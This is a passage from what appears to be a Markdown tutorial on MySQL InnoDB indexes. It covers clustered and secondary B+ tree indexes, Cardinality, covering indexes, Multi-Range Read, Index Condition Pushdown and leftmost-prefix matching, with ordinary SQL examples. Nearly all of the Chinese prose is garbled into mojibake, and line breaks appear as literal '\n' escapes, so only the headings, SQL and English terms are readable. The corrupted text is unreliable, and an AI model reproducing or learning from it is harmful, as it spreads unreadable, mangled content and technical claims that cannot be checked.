‘ï¼ŒåŒæ—¶å¶å­èŠ‚ç‚¹ä¸­å­˜æ”¾çš„å³ä¸ºæ•´å¼ è¡¨çš„è¡Œè®°å½•æ•°æ®ï¼Œä¹Ÿå°†èšé›†ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ç§°ä¸ºæ•°æ®é¡µã€‚\n+ **èšé›†ç´¢å¼•çš„è¿™ä¸ªç‰¹æ€§å†³å®šäº†ç´¢å¼•ç»„ç»‡è¡¨ä¸­æ•°æ®ä¹Ÿæ˜¯ç´¢å¼•çš„ä¸€éƒ¨åˆ†ã€‚**åŒ B+ æ ‘æ•°æ®ç»“æ„ä¸€æ ·ï¼Œæ¯ä¸ªæ•°æ®é¡µéƒ½é€šè¿‡ä¸€ä¸ªåŒå‘é“¾è¡¨æ¥è¿›è¡Œé“¾æ¥ã€‚\n+ **ç”±äºå®é™…çš„æ•°æ®é¡µåªèƒ½æŒ‰ç…§ä¸€æ£µ B+ æ ‘è¿›è¡Œæ’åºï¼Œå› æ­¤æ¯å¼ è¡¨åªèƒ½æ‹¥æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ã€‚**åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢ä¼˜åŒ–å™¨å€¾å‘äºé‡‡ç”¨èšé›†ç´¢å¼•ã€‚å› ä¸ºèšé›†ç´¢å¼•èƒ½å¤Ÿåœ¨ B+ æ ‘ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ä¸Šç›´æ¥æ‰¾åˆ°æ•°æ®ã€‚æ­¤å¤–ï¼Œç”±äºå®šä¹‰äº†æ•°æ®çš„é€»è¾‘é¡ºåºï¼Œèšé›†ç´¢å¼•èƒ½å¤Ÿç‰¹åˆ«å¿«åœ°è®¿é—®é’ˆå¯¹èŒƒå›´å€¼çš„æŸ¥è¯¢ã€‚æŸ¥è¯¢ä¼˜åŒ–å™¨èƒ½å¤Ÿå¿«é€Ÿå‘ç°æŸä¸€æ®µèŒƒå›´çš„æ•°æ®é¡µéœ€è¦æ‰«æã€‚\n+ èšé›†ç´¢å¼•çš„å­˜å‚¨å¹¶ä¸æ˜¯ç‰©ç†ä¸Šè¿ç»­çš„ï¼Œè€Œæ˜¯é€»è¾‘ä¸Šè¿ç»­çš„ã€‚\n+ å¦‚æœä¸€ä¸ªä¸»é”®è¢«å®šä¹‰äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸»é”®å°±æ˜¯ä½œä¸ºèšé›†ç´¢å¼•ã€‚å¦‚æœæ²¡æœ‰ä¸»é”®è¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¯¥è¡¨çš„ç¬¬ä¸€ä¸ªå”¯ä¸€éç©ºç´¢å¼•è¢«ä½œä¸ºèšé›†ç´¢å¼•ã€‚å¦‚æœæ²¡æœ‰ä¸»é”®ä¹Ÿæ²¡æœ‰åˆé€‚çš„å”¯ä¸€ç´¢å¼•ï¼Œé‚£ä¹ˆinnodbå†…éƒ¨ä¼šç”Ÿæˆä¸€ä¸ªéšè—çš„ä¸»é”®ä½œä¸ºèšé›†ç´¢å¼•ï¼Œè¿™ä¸ªéšè—çš„ä¸»é”®æ˜¯ä¸€ä¸ª6ä¸ªå­—èŠ‚çš„åˆ—ï¼Œæ”¹åˆ—çš„å€¼ä¼šéšç€æ•°æ®çš„æ’å…¥è‡ªå¢ã€‚\n+ èšé›†ç´¢å¼•çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå®ƒå¯¹äºä¸»é”®çš„æ’åºæŸ¥æ‰¾å’ŒèŒƒå›´æŸ¥æ‰¾é€Ÿåº¦éå¸¸å¿«ã€‚å¶å­èŠ‚ç‚¹çš„æ•°æ®å°±æ˜¯ç”¨æˆ·æ‰€è¦æŸ¥è¯¢çš„æ•°æ®ã€‚\n\n\n\n### 3.2 InnoDBçš„èšé›†ç´¢å¼•å’Œéèšé›†ç´¢å¼•\n\nåœ¨æ•°æ®åº“ä¸­ï¼ŒB+ æ ‘çš„é«˜åº¦ä¸€èˆ¬éƒ½åœ¨ 2ï½4 å±‚ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´æŸ¥æ‰¾æŸä¸€é”®å€¼çš„è¡Œè®°å½•æ—¶æœ€å¤šåªéœ€è¦ 2 åˆ° 4 æ¬¡ IOï¼Œè¿™å€’ä¸é”™ã€‚å› ä¸ºå½“å‰ä¸€èˆ¬çš„æœºæ¢°ç£ç›˜æ¯ç§’è‡³å°‘å¯ä»¥åš 100 æ¬¡ IOï¼Œ2ï½4 æ¬¡çš„ IO æ„å‘³ç€æŸ¥è¯¢æ—¶é—´åªéœ€ 0.02ï½0.04 ç§’ã€‚\n\n##### 1. InnoDB æ˜¯ç”±ä¸€ä¸ªèšé›†ç´¢å¼•å’Œéèšé›†ç´¢å¼•æ„æˆ\n\næ•°æ®åº“ä¸­çš„B+æ ‘ç´¢å¼•å¯ä»¥åˆ†ä¸ºèšé›†ç´¢å¼•ï¼ˆclustered inexï¼‰å’Œè¾…åŠ©ç´¢å¼•ï¼ˆsecondary indexï¼‰ã€‚è¾…åŠ©ç´¢å¼•æœ‰æ—¶ä¹Ÿç§°éèšé›†ç´¢å¼•ï¼ˆnon-clustered indexï¼‰ã€‚\n\nä½†æ˜¯ä¸ç®¡æ˜¯èšé›†è¿˜æ˜¯è¾…åŠ©çš„ç´¢å¼•ï¼Œå…¶å†…éƒ¨éƒ½æ˜¯B+æ ‘çš„ï¼Œå³é«˜åº¦å¹³è¡¡çš„ï¼Œå¶å­èŠ‚ç‚¹å­˜æ”¾ç€æ‰€æœ‰çš„æ•°æ®ã€‚èšé›†ç´¢å¼•ä¸è¾…åŠ©ç´¢å¼•ä¸åŒçš„æ˜¯ï¼Œå¶å­èŠ‚ç‚¹å­˜æ”¾çš„æ˜¯å¦æ˜¯ä¸€æ•´è¡Œçš„ä¿¡æ¯ã€‚\n\n##### 2. InnoDB éèšé›†ç´¢å¼•\n\nå¶å­èŠ‚ç‚¹å¹¶ä¸åŒ…å«è¡Œè®°å½•çš„å…¨éƒ¨æ•°æ®ï¼ˆåªæœ‰ç´¢å¼•å­—æ®µæœ¬èº«çš„æ•°æ®ï¼ŒåºŸè¯ï¼‰ã€‚å¶å­èŠ‚ç‚¹é™¤äº†åŒ…å«é”®å€¼ä»¥å¤–ï¼Œæ¯ä¸ªå¶å­èŠ‚ç‚¹ä¸­çš„ç´¢å¼•è¡Œä¸­è¿˜åŒ…å«äº†ä¸€ä¸ªä¹¦ç­¾ï¼ˆbookmarkï¼‰ã€‚è¯¥ä¹¦ç­¾ç”¨æ¥å‘Šè¯‰InnoDBå­˜å‚¨å¼•æ“å“ªé‡Œå¯ä»¥æ‰¾åˆ°ä¸ç´¢å¼•ç›¸å¯¹åº”çš„è¡Œæ•°æ®ã€‚\n\n<img src=\"mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/6.png\" alt=\"1\" style=\"zoom:50%;\" />\n\nå¦‚æœåœ¨ä¸€æ£µé«˜åº¦ä¸º3çš„è¾…åŠ©ç´¢å¼•æ ‘ä¸­æŸ¥æ‰¾æ•°æ®ï¼Œé‚£éœ€è¦å¯¹è¿™æ£µè¾…åŠ©ç´¢å¼•æ ‘éå†3æ¬¡æ‰¾åˆ°æŒ‡å®šä¸»é”®ï¼Œå¦‚æœèšé›†ç´¢å¼•æ ‘çš„é«˜åº¦åŒæ ·ä¸º3ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¯¹èšé›†ç´¢å¼•æ ‘è¿›è¡Œ3æ¬¡æŸ¥æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ªå®Œæ•´çš„è¡Œæ•°æ®æ‰€åœ¨çš„é¡µï¼Œå› æ­¤ä¸€å…±éœ€è¦6æ¬¡é€»è¾‘IOè®¿é—®ä»¥å¾—åˆ°æœ€ç»ˆçš„ä¸€ä¸ªæ•°æ®é¡µã€‚\n\n### 3.3 æ€»ç»“\n\nä¾‹å¦‚çŸ¥é“äº†InnoDBçš„ç´¢å¼•å®ç°åï¼Œå°±å¾ˆå®¹æ˜“æ˜ç™½ä¸ºä»€ä¹ˆä¸å»ºè®®ä½¿ç”¨è¿‡é•¿çš„å­—æ®µä½œä¸ºä¸»é”®ï¼Œå› ä¸ºæ‰€æœ‰è¾…åŠ©ç´¢å¼•éƒ½å¼•ç”¨ä¸»ç´¢å¼•ï¼Œè¿‡é•¿çš„ä¸»ç´¢å¼•ä¼šä»¤è¾…åŠ©ç´¢å¼•å˜å¾—è¿‡å¤§ã€‚\n\nå†ä¾‹å¦‚ï¼Œç”¨éå•è°ƒçš„å­—æ®µä½œä¸ºä¸»é”®åœ¨InnoDBä¸­ä¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºInnoDBæ•°æ®æ–‡ä»¶æœ¬èº«æ˜¯ä¸€é¢—B+Treeï¼Œéå•è°ƒçš„ä¸»é”®ä¼šé€ æˆåœ¨æ’å…¥æ–°è®°å½•æ—¶æ•°æ®æ–‡ä»¶ä¸ºäº†ç»´æŒB+Treeçš„ç‰¹æ€§è€Œé¢‘ç¹çš„åˆ†è£‚è°ƒæ•´ï¼Œååˆ†ä½æ•ˆï¼Œè€Œä½¿ç”¨è‡ªå¢å­—æ®µintä½œä¸ºä¸»é”®åˆ™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚\n\n\n\n# 4. ç´¢å¼•æœºåˆ¶\n\n### 4.1 æŸ¥çœ‹ç´¢å¼•\n\n```sql\nSHOW INDEX FROM table_name;\n```\n\nCardinalityï¼šéå¸¸å…³é”®çš„å€¼ï¼Œè¡¨ç¤ºç´¢å¼•ä¸­å”¯ä¸€å€¼çš„æ•°ç›®çš„ä¼°è®¡å€¼ã€‚Cardinalityè¡¨çš„è¡Œæ•°åº”å°½å¯èƒ½æ¥è¿‘1ï¼Œå¦‚æœéå¸¸å°ï¼Œé‚£ä¹ˆç”¨æˆ·éœ€è¦è€ƒè™‘æ˜¯å¦å¯ä»¥åˆ é™¤æ­¤ç´¢å¼•ã€‚\n\nNullï¼šæ˜¯å¦ç´¢å¼•çš„åˆ—å«æœ‰NULLå€¼ã€‚å¯ä»¥çœ‹åˆ°idx_bè¿™é‡Œä¸ºYesï¼Œå› ä¸ºå®šä¹‰çš„åˆ—bå…è®¸NULLå€¼ã€‚\n\n### 4.2 Cardinality\n\nCardinalityå€¼éå¸¸å…³é”®ï¼Œä¼˜åŒ–å™¨ä¼šæ ¹æ®è¿™ä¸ªå€¼æ¥åˆ¤æ–­æ˜¯å¦ä½¿ç”¨è¿™ä¸ªç´¢å¼•ã€‚\n\nä½†æ˜¯è¿™ä¸ªå€¼å¹¶ä¸æ˜¯å®æ—¶æ›´æ–°çš„ï¼Œå¦‚æœéœ€è¦æ›´æ–°ç´¢å¼•Cardinalityçš„ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ANALYZE TABLEå‘½ä»¤ã€‚\n\nå¯¹ä¸¤æ¡åŸºæœ¬ä¸€æ ·çš„è¯­å¥æ‰§è¡ŒEXPLAINï¼Œä½†æ˜¯æœ€ç»ˆå‡ºæ¥çš„ç»“æœä¸ä¸€æ ·ï¼šä¸€ä¸ªä½¿ç”¨ç´¢å¼•ï¼Œå¦å¤–ä¸€ä¸ªä½¿ç”¨å…¨è¡¨æ‰«æã€‚è¿™æ—¶æœ€å¥½çš„è§£å†³åŠæ³•å°±æ˜¯åšä¸€æ¬¡ANALYZE TABLEçš„æ“ä½œã€‚å› æ­¤æˆ‘å»ºè®®åœ¨ä¸€ä¸ªéé«˜å³°æ—¶é—´ï¼Œå¯¹åº”ç”¨ç¨‹åºä¸‹çš„å‡ å¼ æ ¸å¿ƒè¡¨åšANALYZE TABLEæ“ä½œï¼Œè¿™èƒ½ä½¿ä¼˜åŒ–å™¨å’Œç´¢å¼•æ›´å¥½åœ°ä¸ºä½ å·¥ä½œã€‚\n\nåœ¨InnoDBå­˜å‚¨å¼•æ“ä¸­ï¼ŒCardinalityç»Ÿè®¡ä¿¡æ¯çš„æ›´æ–°å‘ç”Ÿåœ¨ä¸¤ä¸ªæ“ä½œä¸­ï¼šINSERTå’ŒUPDATEã€‚ä½†æ˜¯è¡¨ä¸­1/16çš„æ•°æ®å·²å‘ç”Ÿè¿‡å˜åŒ–ï¼Œæˆ–è€…stat_modified_counterï¼2 000 000 000\n\n### 4.3 è¦†ç›–ç´¢å¼•\n\nInnoDBå­˜å‚¨å¼•æ“æ”¯æŒè¦†ç›–ç´¢å¼•ï¼ˆcovering indexï¼Œæˆ–ç§°ç´¢å¼•è¦†ç›–ï¼‰ï¼Œå³ä»è¾…åŠ©ç´¢å¼•ä¸­å°±å¯ä»¥å¾—åˆ°æŸ¥è¯¢çš„è®°å½•ï¼Œè€Œä¸éœ€è¦æŸ¥è¯¢èšé›†ç´¢å¼•ä¸­çš„è®°å½•ã€‚\n\n\n\nå¯¹äºInnoDBå­˜å‚¨å¼•æ“çš„è¾…åŠ©ç´¢å¼•è€Œè¨€ï¼Œç”±äºå…¶åŒ…å«äº†ä¸»é”®ä¿¡æ¯ï¼Œå› æ­¤å…¶å¶å­èŠ‚ç‚¹å­˜æ”¾çš„æ•°æ®ä¸ºï¼ˆprimary key1ï¼Œprimary key2ï¼Œâ€¦ï¼Œkey1ï¼Œkey2ï¼Œâ€¦ï¼‰ã€‚ä¾‹å¦‚ï¼Œä¸‹åˆ—è¯­å¥éƒ½å¯ä»…ä½¿ç”¨ä¸€æ¬¡è¾…åŠ©è”åˆç´¢å¼•æ¥å®ŒæˆæŸ¥è¯¢ï¼š\n\n```sql\nSELECT key2 FROM table WHERE key1=xxxï¼›\nSELECT primary key2,key2 FROM table WHERE key1=xxxï¼›\nSELECT primary key1,key2 FROM table WHERE key1=xxxï¼›\nSELECT primary key1,primary key2ï¼Œkey2 FROM table WHERE key1=xxxï¼›\n```\n\nè¦†ç›–ç´¢å¼•çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯å¯¹æŸäº›ç»Ÿè®¡é—®é¢˜è€Œè¨€çš„ã€‚\n\n```sql\nSELECT COUNT(*)FROM buy_log;\n```\n\nInnoDBå­˜å‚¨å¼•æ“å¹¶ä¸ä¼šé€‰æ‹©é€šè¿‡æŸ¥è¯¢èšé›†ç´¢å¼•æ¥è¿›è¡Œç»Ÿè®¡ã€‚ç”±äºbuy_logè¡¨ä¸Šè¿˜æœ‰è¾…åŠ©ç´¢å¼•ï¼Œè€Œè¾…åŠ©ç´¢å¼•è¿œå°äºèšé›†ç´¢å¼•ï¼Œé€‰æ‹©è¾…åŠ©ç´¢å¼•å¯ä»¥å‡å°‘IOæ“ä½œã€‚\n\n\n\n```sql\nSELECT COUNT(*)FROM buy_log\nWHERE buy_dateï¼='2011-01-01'AND buy_dateï¼œ'2011-02-01'\n```\n\nè¡¨buy_logæœ‰ï¼ˆuseridï¼Œbuy_dateï¼‰çš„è”åˆç´¢å¼•ï¼Œè¿™é‡Œåªæ ¹æ®åˆ—bè¿›è¡Œæ¡ä»¶æŸ¥è¯¢ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸èƒ½è¿›è¡Œè¯¥è”åˆç´¢å¼•çš„ï¼Œä½†æ˜¯è¿™å¥SQLæŸ¥è¯¢æ˜¯ç»Ÿè®¡æ“ä½œï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨åˆ°è¦†ç›–ç´¢å¼•çš„ä¿¡æ¯ï¼Œå› æ­¤ä¼˜åŒ–å™¨ä¼šé€‰æ‹©è¯¥è”åˆç´¢å¼•ã€‚\n\n\n\n### 4.4 ä½¿ç”¨æŸä¸ªç´¢å¼•\n\nå¦‚æœç”¨æˆ·ç¡®å®šæŒ‡å®šæŸä¸ªç´¢å¼•æ¥å®ŒæˆæŸ¥è¯¢ï¼Œé‚£ä¹ˆæœ€å¯é çš„æ˜¯ä½¿ç”¨FORCE INDEXï¼Œè€Œä¸æ˜¯USE INDEXã€‚\n\n\n\n# 5. ç´¢å¼•æŠ€æœ¯ä¼˜åŒ–\n\n### 5.1 Multi-Range Read ä¼˜åŒ–ï¼ˆå¤šèŒƒå›´è¯»ï¼‰\n\nMySQL5.6 ç‰ˆæœ¬å¼€å§‹æ”¯æŒ Multi-Range Readï¼ˆMRRï¼‰ä¼˜åŒ–ã€‚Multi-Range Read ä¼˜åŒ–çš„ç›®çš„å°±æ˜¯ä¸ºäº†å‡å°‘ç£ç›˜çš„éšæœºè®¿é—®ï¼Œå¹¶ä¸”å°†éšæœºè®¿é—®è½¬åŒ–ä¸ºè¾ƒä¸ºé¡ºåºçš„æ•°æ®è®¿é—®ï¼Œè¿™å¯¹äº IO-bound ç±»å‹çš„ SQL æŸ¥è¯¢è¯­å¥å¯å¸¦æ¥æ€§èƒ½æå¤§çš„æå‡ã€‚\n\n```sql\nSELECT*FROM salaries WHERE salaryï¼10000 AND salaryï¼œ40000;\n```\n\nsalaryä¸Šæœ‰ä¸€ä¸ªè¾…åŠ©ç´¢å¼•idx_sï¼Œå› æ­¤é™¤äº†é€šè¿‡è¾…åŠ©ç´¢å¼•æŸ¥æ‰¾é”®å€¼å¤–ï¼Œè¿˜éœ€è¦é€šè¿‡ä¹¦ç­¾æŸ¥æ‰¾æ¥è¿›è¡Œå¯¹æ•´è¡Œæ•°æ®çš„æŸ¥è¯¢ã€‚\n\nè‹¥å¯ç”¨Mulit-Range Readç‰¹æ€§ï¼Œåˆ™é™¤äº†ä¼šåœ¨åˆ—Extraçœ‹åˆ°Using index conditionå¤–ï¼Œè¿˜ä¼šçœ‹è§Using MRRé€‰é¡¹ã€‚æ‰§è¡Œæ—¶é—´ç›¸å·®10å€ä¹‹å¤šã€‚\n\nMRRçš„å·¥ä½œæ–¹å¼å¦‚ä¸‹ï¼š\n\n+ å°†æŸ¥è¯¢å¾—åˆ°çš„è¾…åŠ©ç´¢å¼•é”®å€¼å­˜æ”¾äºä¸€ä¸ªç¼“å­˜ä¸­ï¼Œè¿™æ—¶ç¼“å­˜ä¸­çš„æ•°æ®æ˜¯æ ¹æ®è¾…åŠ©ç´¢å¼•é”®å€¼æ’åºçš„ã€‚\n+ å°†ç¼“å­˜ä¸­çš„é”®å€¼æ ¹æ®RowIDè¿›è¡Œæ’åºã€‚\n+ æ ¹æ®RowIDçš„æ’åºé¡ºåºæ¥è®¿é—®å®é™…çš„æ•°æ®æ–‡ä»¶ã€‚\n\n\n\n```sql\nSELECT*FROM t\nWHERE key_part1ï¼=1000 AND key_part1ï¼œ2000\nAND key_part2=10000;\n```\n\nè‹¥æ²¡æœ‰Multi-Read Rangeï¼Œæ­¤æ—¶æŸ¥è¯¢ç±»å‹ä¸ºRangeï¼ŒSQLä¼˜åŒ–å™¨ä¼šå…ˆå°†key_part1å¤§äº1000ä¸”å°äº2000çš„æ•°æ®éƒ½å–å‡ºï¼Œå³ä½¿key_part2ä¸ç­‰äº1000ã€‚å¾…å–å‡ºè¡Œæ•°æ®åå†æ ¹æ®key_part2çš„æ¡ä»¶è¿›è¡Œè¿‡æ»¤ã€‚è¿™ä¼šå¯¼è‡´æ— ç”¨æ•°æ®è¢«å–å‡ºã€‚\n\nå€˜è‹¥å¯ç”¨äº†Multi-Range Readä¼˜åŒ–ï¼Œä¼˜åŒ–å™¨ä¼šå…ˆå°†æŸ¥è¯¢æ¡ä»¶è¿›è¡Œæ‹†åˆ†ï¼Œç„¶åå†è¿›è¡Œæ•°æ®æŸ¥è¯¢ã€‚å°±ä¸Šè¿°æŸ¥è¯¢è¯­å¥è€Œè¨€ï¼Œä¼˜åŒ–å™¨ä¼šå°†æŸ¥è¯¢æ¡ä»¶æ‹†åˆ†ä¸ºï¼ˆ1000ï¼Œ1000ï¼‰ï¼Œï¼ˆ1001ï¼Œ1000ï¼‰ï¼Œï¼ˆ1002ï¼Œ1000ï¼‰ï¼Œâ€¦ï¼Œï¼ˆ1999ï¼Œ1000ï¼‰ï¼Œæœ€åå†æ ¹æ®è¿™äº›æ‹†åˆ†å‡ºçš„æ¡ä»¶è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢ã€‚\n\n\n\n### 5.2 Index Condition Pushdown ä¼˜åŒ–ï¼ˆç´¢å¼•ä¸‹æ¨ï¼‰\n\n- åœ¨ä¸ä½¿ç”¨ICPçš„æƒ…å†µä¸‹ï¼Œåœ¨ä½¿ç”¨éä¸»é”®ç´¢å¼•ï¼ˆåˆå«æ™®é€šç´¢å¼•æˆ–è€…äºŒçº§ç´¢å¼•ï¼‰è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œå­˜å‚¨å¼•æ“é€šè¿‡ç´¢å¼•æ£€ç´¢åˆ°æ•°æ®ï¼Œç„¶åè¿”å›ç»™MySQLæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç„¶ååˆ¤æ–­æ•°æ®æ˜¯å¦ç¬¦åˆæ¡ä»¶ ã€‚\n- åœ¨ä½¿ç”¨ICPçš„æƒ…å†µä¸‹ï¼Œå¦‚æœå­˜åœ¨æŸäº›è¢«ç´¢å¼•çš„åˆ—çš„åˆ¤æ–­æ¡ä»¶æ—¶ï¼ŒMySQLæœåŠ¡å™¨å°†è¿™ä¸€éƒ¨åˆ†åˆ¤æ–­æ¡ä»¶ä¼ é€’ç»™å­˜å‚¨å¼•æ“ï¼Œç„¶åç”±å­˜å‚¨å¼•æ“é€šè¿‡åˆ¤æ–­ç´¢å¼•æ˜¯å¦ç¬¦åˆMySQLæœåŠ¡å™¨ä¼ é€’çš„æ¡ä»¶ï¼Œåªæœ‰å½“ç´¢å¼•ç¬¦åˆæ¡ä»¶æ—¶æ‰ä¼šå°†æ•°æ®æ£€ç´¢å‡ºæ¥è¿”å›ç»™MySQLæœåŠ¡å™¨ ã€‚\n- ç´¢å¼•æ¡ä»¶ä¸‹æ¨ä¼˜åŒ–å¯ä»¥å‡å°‘å­˜å‚¨å¼•æ“æŸ¥è¯¢åŸºç¡€è¡¨çš„æ¬¡æ•°ï¼Œä¹Ÿå¯ä»¥å‡å°‘MySQLæœåŠ¡å™¨ä»å­˜å‚¨å¼•æ“æ¥æ”¶æ•°æ®çš„æ¬¡æ•°ã€‚\n\n+ å½“ä¼˜åŒ–å™¨é€‰æ‹© Index Condition Pushdown ä¼˜åŒ–æ—¶ï¼Œå¯åœ¨æ‰§è¡Œè®¡åˆ’çš„åˆ— Extra çœ‹åˆ° Using index condition æç¤ºã€‚\n\n\n\nå‡è®¾æŸå¼ è¡¨æœ‰è”åˆç´¢å¼•(zip_codeï¼Œlast_nameï¼Œfirst_name)ï¼Œå¹¶ä¸”æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š\n\n```sql\nSELECT*FROM people\nWHERE zipcode='95054'\nAND lastname LIKE'%etrunia%'\nAND address LIKE'%Main Street%';\n```\n\nè‹¥ä¸æ”¯æŒ Index Condition Pushdown ä¼˜åŒ–ï¼Œåˆ™æ•°æ®åº“éœ€è¦å…ˆé€šè¿‡ç´¢å¼•å–å‡ºæ‰€æœ‰ zipcode ç­‰äº 95054 çš„è®°å½•ï¼Œç„¶åå†è¿‡æ»¤ WHERE ä¹‹åçš„ä¸¤ä¸ªæ¡ä»¶ã€‚\n\nè‹¥æ”¯æŒ Index Condition Pushdown ä¼˜åŒ–ï¼Œåˆ™åœ¨ç´¢å¼•å–å‡ºæ—¶ï¼Œå°±ä¼šè¿›è¡Œ WHERE æ¡ä»¶çš„è¿‡æ»¤ï¼Œç„¶åå†å»è·å–è®°å½•ã€‚è¿™å°†æå¤§åœ°æé«˜æŸ¥è¯¢çš„æ•ˆç‡ã€‚å½“ç„¶ï¼ŒWHERE å¯ä»¥è¿‡æ»¤çš„æ¡ä»¶æ˜¯è¦è¯¥ç´¢å¼•å¯ä»¥è¦†ç›–åˆ°çš„èŒƒå›´ã€‚\n\nIndex Condition Pushdown ä¼˜åŒ–å¯ä»¥å°†æŸ¥è¯¢æ•ˆç‡åœ¨åŸæœ‰ MySQL 5.5 ç‰ˆæœ¬çš„æŠ€æœ¯ä¸Šæé«˜ 23%ã€‚è€Œå†åŒæ—¶å¯ç”¨ Mulit-Range Read ä¼˜åŒ–åï¼Œæ€§èƒ½è¿˜èƒ½æœ‰ 400% çš„æå‡ï¼\n\n# 6. å»ºç´¢å¼•åŸåˆ™\n\n### 6.1 æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™\n\néå¸¸é‡è¦çš„åŸåˆ™. mysqlä¼šä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢(>ã€<ã€betweenã€like) å°±åœæ­¢åŒ¹é…, å¤åˆç´¢å¼•çš„ç¬¬ä¸€ä¸ª, å¿…é¡»å…ˆæŸ¥, æ‰èƒ½ç»§ç»­ã€‚\n\n1. å¦‚æœå»ºç«‹(a,b)é¡ºåºçš„ç´¢å¼•\n\n+ æŸ¥è¯¢ b = 2 ï¼Œæ˜¯åŒ¹é…ä¸åˆ°(a,b)ç´¢å¼•çš„\n\n+ æŸ¥è¯¢ a = 1 and b = 2 æˆ–è€… a = 1  åˆæˆ–è€…  b = 2 and a = 1 éƒ½å¯ä»¥ï¼Œå› ä¸ºä¼˜åŒ–å™¨ä¼šè‡ªåŠ¨è°ƒæ•´a,bçš„é¡ºåºã€‚\n\n\n\n2. å¦‚æœå»ºç«‹(a,b,c,d)é¡ºåºçš„ç´¢å¼•\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ï¼Œdæ˜¯ç”¨ä¸åˆ°ç´¢å¼•çš„ï¼Œå› ä¸ºcå­—æ®µæ˜¯ä¸€ä¸ªèŒƒå›´æŸ¥è¯¢ï¼Œå®ƒä¹‹åçš„å­—æ®µä¼šåœæ­¢åŒ¹é…ã€‚\n\n\n\n3. å¦‚æœå»ºç«‹(a,b,d,c)é¡ºåºçš„ç´¢å¼•\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ,  ç´¢å¼•åˆ™éƒ½å¯ä»¥ç”¨åˆ°ï¼Œa,b,dçš„é¡ºåºå¯ä»¥ä»»æ„è°ƒæ•´ã€‚\n\n### 6.2 æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ï¼ï¼ï¼\n\n+ å·¦è¾¹çš„å¿…é¡»åœ¨æ‰èµ°ç´¢å¼•!!!\n+ (col1, col2, col3)è¿™ä¸ªå¤åˆç´¢å¼•çš„æ‰€æœ‰å‰ç¼€ å°±æ˜¯(col1), (col1, col2), (col1, col2, col3), åŒ…å«è¿™äº›åˆ—çš„æŸ¥è¯¢éƒ½ä¼šå¯ç”¨ç´¢å¼•æŸ¥è¯¢.\n+ å…¶ä»–æ‰€æœ‰ä¸åœ¨æœ€å·¦å‰ç¼€é‡Œçš„åˆ—éƒ½ä¸ä¼šå¯ç”¨ç´¢å¼•, å³ä½¿åŒ…å«äº†è”åˆç´¢å¼•é‡Œçš„éƒ¨åˆ†åˆ—ä¹Ÿä¸è¡Œ. å³ä¸Šè¿°ä¸­çš„(col2), (col3), (col2, col3) éƒ½ä¸ä¼šå¯ç”¨ç´¢å¼•å»æŸ¥è¯¢.\n+ æ³¨æ„, (col1, col3)ä¼šå¯ç”¨(col1)çš„ç´¢å¼•æŸ¥è¯¢.\n\n### 6.3 å°½é‡é€‰æ‹©åŒºåˆ†åº¦é«˜çš„åˆ—ä½œä¸ºç´¢å¼•\n\nåŒºåˆ†åº¦çš„å…¬å¼æ˜¯**count(distinct col)/count(*)**ï¼Œè¡¨ç¤ºå­—æ®µä¸é‡å¤çš„æ¯”ä¾‹ï¼Œæ¯”ä¾‹è¶Šå¤§æˆ‘ä»¬æ‰«æçš„è®°å½•æ•°è¶Šå°‘ï¼Œå”¯ä¸€é”®çš„åŒºåˆ†åº¦æ˜¯1ã€‚ï¼ˆè¶Šå¤§è¶Šå¥½ï¼‰ã€‚\n\nè€Œä¸€äº›çŠ¶æ€ã€æ€§åˆ«å­—æ®µå¯èƒ½åœ¨å¤§æ•°æ®é¢å‰åŒºåˆ†åº¦å°±æ˜¯0ï¼Œé‚£å¯èƒ½æœ‰äººä¼šé—®ï¼Œè¿™ä¸ªæ¯”ä¾‹æœ‰ä»€ä¹ˆç»éªŒå€¼å—ï¼Ÿä½¿ç”¨åœºæ™¯ä¸åŒï¼Œè¿™ä¸ªå€¼ä¹Ÿå¾ˆéš¾ç¡®å®šï¼Œä¸€èˆ¬éœ€è¦joinçš„å­—æ®µæˆ‘ä»¬éƒ½è¦æ±‚æ˜¯0.1ä»¥ä¸Šï¼Œå³å¹³å‡1æ¡æ‰«æ10æ¡è®°å½•ã€‚\n\n\n\nç´¢å¼•åˆ—çš„åŸºæ•°è¶Šå¤§ï¼Œç´¢å¼•çš„æ•ˆæœè¶Šå¥½ã€‚ä¾‹å¦‚ï¼Œå­˜æ”¾å‡ºç”Ÿæ—¥æœŸçš„åˆ—å…·æœ‰ä¸åŒçš„å€¼ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†è¡Œï¼Œè€Œç”¨æ¥è®°å½•æ€§åˆ«çš„åˆ—ï¼Œåªæœ‰\"M\"å’Œ\"F\",åˆ™å¯¹æ­¤è¿›è¡Œç´¢å¼•æ²¡æœ‰å¤šå¤§ç”¨å¤„ï¼Œå› æ­¤ä¸ç®¡æœç´¢å“ªä¸ªå€¼ï¼Œéƒ½ä¼šå¾—å‡ºå¤§çº¦ä¸€åŠçš„è¡Œã€‚\n\n### 6.4 ç¦»æ•£åº¦æ›´é«˜çš„ç´¢å¼•åº”è¯¥æ”¾åœ¨å¤åˆç´¢å¼•çš„å‰é¢\n\nå› 